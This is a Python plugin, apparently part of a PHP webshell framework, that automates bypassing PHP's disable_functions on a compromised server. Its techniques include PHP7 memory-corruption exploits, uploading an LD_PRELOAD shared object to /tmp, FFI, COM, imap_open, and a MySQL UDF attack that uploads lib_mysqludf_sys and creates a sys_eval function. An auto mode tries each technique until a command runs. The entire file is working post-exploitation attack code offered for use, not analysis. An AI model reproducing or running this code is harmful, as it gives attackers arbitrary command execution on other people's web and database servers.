from os import path
from uuid import uuid4

from libs.app import readline
from libs.config import alias, color, gget, gset
from libs.myapp import execute_sql_command, get_system_code, is_windows, send
from webshell_plugins.upload import run as upload

mode_to_desc_dict = {-1: color.red("closed"),
                     1: color.green("php7-backtrace"),
                     2: color.green("php7-gc"),
                     3: color.green("php7-json"),
                     4: color.green("LD_PRELOAD"),
                     5: color.green("FFI"),
                     6: color.green("COM"),
                     7: color.green("imap_open"),
                     8: color.green("MYSQL-UDF"),
                     9:color.green("php7-SplDoublyLinkedList"),}
mode_linux_set = {1, 2, 3, 4, 5, 9}
mode_windows_set = {6, }
mode_require_ext_dict = {5: "FFI", 6: "com_dotnet", 7: "imap"}

total_test_list = set(mode_to_desc_dict.keys()) - {-1}
windows_test_list = total_test_list - mode_linux_set
linux_test_list = total_test_list - mode_windows_set


def get_detectd_ld_preload():
    return """$a=array('mail','error_log', 'mb_send_mail', 'imap_mail');
$disabled = explode(',', ini_get('disable_functions'));
foreach ($a as $v){
    if (is_callable($v) && !in_array($v, $disabled)){
        echo $v;
        break;
    }
}"""


def get_detectd_ext(extname: str):
    return """if (extension_loaded("%s")){echo "exist";}""" % extname


def set_mode(mode: int, test: bool = False):
    if (mode == 4 and not gget("webshell.ld_preload_path", "webshell", False)):  # ld_preload
        disable_func_list = gget("webshell.disable_functions", "webshell")
        if (not gget("webshell.ld_preload_path", "webshell", None)):
            filename = "/tmp/%s.so" % str(uuid4())
            ld_preload_func = send(get_detectd_ld_preload()).r_text.strip()
            upload_result = upload(
                path.join(gget("root_path"), "auxiliary", "ld_preload", "ld_preload_x86_64.so"), filename, True)
            if (not upload_result):
                return
            gset("webshell.ld_preload_path", filename, True, "webshell")
            gset("webshell.ld_preload_func", ld_preload_func, True, "webshell")
            if ("putenv" in disable_func_list):
                print(color.red("\nputenv is disabled\n"))
                return False
            if (not ld_preload_func):
                print(color.red("\nNo ld_preload function!\n"))
                return False
    if (mode in mode_require_ext_dict):
        ext = mode_require_ext_dict[mode]
        res = send(get_detectd_ext(ext))
        if (not res):
            return False
        text = res.r_text.strip()
        if ("exist" not in text):
            print(color.red(f"\nNo {ext} extension\n"))
            return False
    if (mode == 8):  # udf
        if (gget("db_connected", "webshell") and gget("db_dbms", "webshell") == "mysql"):
            print(color.yellow(f"\nDetect plugin dir..."))
            plugin_dir_res = execute_sql_command(
                "show variables like '%plugin_dir%';", raw=True)
            if (len(plugin_dir_res) > 1 and len(plugin_dir_res[1]) > 1):
                plugin_dir = plugin_dir_res[1][1].strip().replace("\\", "\\\\")
            else:
                print(color.red(f"\nCould not find plugin_dir"))
                return False
            print(color.yellow(f"\nMake plugin dir..."))
            phpcode = '''if(!is_dir("%s") and !mkdir("%s", 0777, true)){print("fail");}''' % (
                plugin_dir, plugin_dir)
            res = send(phpcode)
            if (not res or "fail" in res.r_text):
                print(color.red(f"\nMake plugin dir failed!\n"))
                return False
            system = "windows" if (
                gget("webshell.iswin", "webshell")) else "linux"
            print("\nReference Information:", gget("webshell.os_version", "webshell"))
            print("\nInput target system bits (32/64/exit): ", end="")
            bits = "64"
            _ = readline().strip()
            if (_ == "32"):
                bits = 32
            elif (_ in ["back", "exit", "quit"] or _ != "64"):
                return False
            udf_ext = ".dll" if (gget("webshell.iswin", "webshell")) else ".so"
            udf_path = plugin_dir + "tmp" + udf_ext
            print(color.yellow(f"\nUpload {udf_ext[1:]}..."))
            upload_result = upload(
                path.join(gget("root_path"), "auxiliary", "udf", "mysql", system, bits, "lib_mysqludf_sys" + udf_ext), udf_path, True)
            if (not upload_result):
                print(color.red("\nUpload failed\n"))
                return
            gset("webshell.udf_path", udf_path, True, "webshell")
            print(color.yellow(f"\nCreate function sys_eval..."))
            execute_sql_command(
                f"create function sys_eval returns string soname 'tmp{udf_ext}'", raw=True)
            test_res = execute_sql_command(
                "select sys_eval('whoami');", raw=True)
            if (len(test_res) > 1 and len(test_res[1][0])):
                print(color.green(f"\nCreate funtion success"))
            else:
                print(color.red(f"\nCreate funtion failed\n"))
                return False
        else:
            print(color.red(f"\nNo connection to database or dbms isn't mysql\n"))
            return False
    if (not test):
        if (mode == 7):
            print(color.yellow(
                f"\nYou may need to wait 1 second to get the result..\n"))
        print(
            f"\nSet bypass disable_functions: {mode}-{mode_to_desc_dict[mode]}\n")
        gset("webshell.bypass_df", mode, True, "webshell")
    return True


@alias(True, _type="OTHER", m="mode")
def run(mode: str = '0'):
    """
    bdf

    Try to bypass disable_functions by php7-backtrace-bypass.

    Mode -1 / Mode close:

        Close bdf

    Mode auto:

        Automatically filter and test all bdf modes

    Mode 0:

        Display the current bdf mode

    Mode 1 php7-backtrace(Only for php7.0-7.4 and *unix) :

        Origin:
        - https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass

        Targets:
        - 7.0 - all versions to date
        - 7.1 - all versions to date
        - 7.2 - all versions to date
        - 7.3 < 7.3.15 (released 20 Feb 2020)
        - 7.4 < 7.4.3 (released 20 Feb 2020)

    Mode 2 php7-gc(Only for php7.0-7.3 and *unix) :

        Origin:
        - https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass

        Targets:
        - 7.0 - all versions to date
        - 7.1 - all versions to date
        - 7.2 - all versions to date
        - 7.3 - all versions to date

    Mode 3 php7-json(Only for php7.1-7.3):

        Origin:
        - https://github.com/mm0r1/exploits/tree/master/php-json-bypass

        Targets:
        - 7.1 - all versions to date
        - 7.2 < 7.2.19 (released 30 May 2019)
        - 7.3 < 7.3.6 (released 30 May 2019)

    Mode 4 LD_PRELOAD(Only for *unix):

        Need:
        - putenv, mail/error_log/mb_send_mail/imap_email fucntions enabled

    Mode 5 FFI(Only for *unix and php >= 7.4):

        Author:
        - MorouU

        Need:
        - FFI extension

    Mode 6 COM(Only for windows):

        Need:
        - com_dotnet extension

    Mode 7 imap_open:

        Need:
        - imap extension

    Mode 8 MYSQL-UDF:

        Need:
        - db_init
        - mysql >= 5.1
    
    Mode 9 php7-plDoublyLinkedList:

        Origin:
        - https://www.freebuf.com/vuls/251017.html

        Targets:
        - 7.1 - all versions to date
        - 7.2 - all versions to date
        - 7.3 - all versions to date
        - 7.4 < 7.4.11

    """
    if (mode == "close"):
        mode = -1
    if (mode == "auto"):
        test_list = windows_test_list if is_windows() else linux_test_list
        php_version = gget("webshell.php_version", "webshell")
        if (not php_version.startswith("7.")):
            test_list -= {1, 2, 3, 9}
        if (not gget("db_connected", "webshell") or gget("db_dbms", "webshell") != "mysql"):
            test_list -= {8}
        for test_mode in test_list:
            print(f"Try Mode {test_mode} {mode_to_desc_dict[test_mode]}:")
            if (set_mode(test_mode, True)):
                res = send(get_system_code(
                    "echo 6ac2ed344113c07c0028327388553273", mode=test_mode))
                if (res and "6ac2ed344113c07c0028327388553273" in res.r_text):
                    print(color.green("\n    Success\n"))
                    print(
                        f"Set bypass disable_functions: {test_mode}-{mode_to_desc_dict[test_mode]}\n")
                    gset("webshell.bypass_df", test_mode, True, "webshell")
                    break
                else:
                    print(color.red("\n    Failed!\n"))
                    continue
    else:
        try:
            mode = int(mode)
        except ValueError:
            print(color.red("\nMode error\n"))
            return
        if (mode == 0):
            print(
                f"\nbypass disable_functions: {mode_to_desc_dict[gget('webshell.bypass_df', 'webshell')]}\n")
        elif (mode in mode_to_desc_dict and (mode not in mode_linux_set or not is_windows())):
            set_mode(mode)
            pass
        else:
            print(color.red("\nMode error\n"))
